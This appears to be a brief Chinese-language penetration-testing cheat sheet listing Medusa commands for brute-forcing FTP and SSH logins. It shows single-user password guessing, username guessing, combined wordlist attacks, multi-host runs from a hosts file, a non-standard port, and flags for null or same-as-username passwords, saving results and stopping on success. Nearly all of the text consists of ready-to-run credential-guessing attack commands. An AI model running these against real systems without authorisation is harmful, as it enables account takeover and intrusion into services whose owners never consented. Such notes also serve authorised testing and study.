	猜测指定用户名的密码
	> medusa -h 192.168.1.141 -u username -P pass.txt -M ftp
	猜测指定密码的用户名
	> medusa -h 192.168.1.141 -U users.txt -p 123 -M ftp
	爆破用户名和密码
	> medusa -h 192.168.1.141 -U users.txt -P pass.txt -M ftp
	针对多台机器
	> medusa -H hosts.txt -U user.txt -P pass.txt -M ftp
	针对特定端口
	> medusa -h 192.168.1.141 -U users.txt -P pass.txt -M ssh
	> medusa -h 192.168.1.141 -U users.txt -P pass.txt -M ssh -n 2222
	-e ns参数
	n代表null ,s代表same相同
	-O result.txt 代表保存结果到文件
	-f代表找到每台机器的一个正确密码停止，-F代表找到任意机器正确密码就停止
	> medusa -H hosts.txt -U users.txt -P pass.txt -M ftp -f
	> medusa -H hosts.txt -U users.txt -P pass.txt -M ftp -F